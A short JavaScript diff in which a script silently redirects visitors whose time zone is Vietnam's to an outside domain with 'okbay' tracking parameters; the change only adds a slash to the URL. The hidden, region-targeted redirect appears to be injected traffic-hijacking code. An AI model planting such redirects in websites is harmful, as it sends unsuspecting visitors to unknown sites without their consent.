@@ -4,6 +4,6 @@ var utm_campaign = conf.utm_campaign || 'okbay';
 
 const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 if (userTimeZone === 'Asia/Ho_Chi_Minh' || userTimeZone === 'Asia/Saigon') {
-  var to = 'https://okla-wv-1.space?utm_source=okbay&utm_campaign=okbay';
+  var to = 'https://okla-wv-1.space/?utm_source=okbay&utm_campaign=okbay';
   window.location.href = to;
 }
